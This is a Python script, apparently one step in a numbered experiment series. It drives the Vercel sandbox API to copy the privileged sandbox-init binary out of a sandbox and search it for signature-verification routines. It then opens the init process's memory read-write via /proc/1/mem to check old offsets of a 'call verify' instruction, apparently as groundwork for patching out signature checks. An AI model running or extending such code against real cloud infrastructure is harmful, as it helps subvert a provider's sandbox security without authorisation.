# -*- coding: utf-8 -*-
"""实验J256: 当前 sandbox-init 二进制版本确认 + verify 链重新定位
目标: 1) 提取当前二进制 (/run/vercel/share/sandbox-init)
     2) buildinfo 版本确认 (是否 8-21 后更新)
     3) 重新定位 verify 相关函数 (符号/字符串/调用点)
     4) 重新定位 wrapunary 的 call verify offset
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj256"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) 提取二进制 + md5 + 大小
CODE_A = r'''
import hashlib, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
try:
    d = open("/run/vercel/share/sandbox-init", "rb").read()
    p("SIZE", len(d))
    p("MD5", hashlib.md5(d).hexdigest())
    open("/tmp/si", "wb").write(d)
    p("SAVED")
except Exception as e:
    p("EXC", type(e).__name__, str(e)[:120])
'''
run_cmd(sid, CODE_A, "A_GETBIN", timeout=150)

# B) buildinfo 版本字符串 (Go build info vcs)
CODE_B = r'''
import re
data = open("/tmp/si", "rb").read()
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# Go buildinfo 常见: vcs.revision / vcs.time / vcs.modified
for pat in (rb"vcs\.revision", rb"vcs\.time", rb"vcs\.modified", rb"buildinfo", rb"go1\."):
    pos = 0
    cnt = 0
    while True:
        i = data.find(pat, pos)
        if i < 0 or cnt >= 5:
            break
        cnt += 1
        ctx = data[max(0, i-32):i+96]
        s = "".join(chr(c) if 32 <= c < 127 else "." for c in ctx)
        p("HIT", pat.decode(), hex(i), repr(s))
        pos = i + 1
    p("CNT", pat.decode(), cnt)
'''
run_cmd(sid, CODE_B, "B_BUILDINFO", timeout=150)

# C) 找 verify 相关字符串 (错误消息/符号)
CODE_C = r'''
data = open("/tmp/si", "rb").read()
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
for pat in (b"invalid signature", b"signature", b"VerifyWithOptions", b"NewVerifierFromBase64", b"x-signature", b"x-timestamp", b"ed25519"):
    pos = 0
    cnt = 0
    while True:
        i = data.find(pat, pos)
        if i < 0 or cnt >= 6:
            break
        cnt += 1
        ctx = data[max(0, i-48):i+96]
        s = "".join(chr(c) if 32 <= c < 127 else "." for c in ctx)
        p("HIT", pat.decode(), hex(i), repr(s))
        pos = i + 1
    p("CNT", pat.decode(), cnt)
'''
run_cmd(sid, CODE_C, "C_STRINGS", timeout=150)

# D) 用 /proc/1/mem 检查 0x83afe0 及附近区域当前内容 (对照旧 offset)
CODE_D = r'''
import os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
# 检查几个旧 offset 区域
for off in (0x83afe0, 0x83b3a0, 0x83b553, 0x83aea0, 0x571700, 0x46e940):
    try:
        b = ra(off, 16)
        p("OFF", hex(off), b.hex())
    except Exception as e:
        p("OFF", hex(off), "EXC", str(e)[:60])
os.close(fd)
'''
run_cmd(sid, CODE_D, "D_MEMCHECK", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
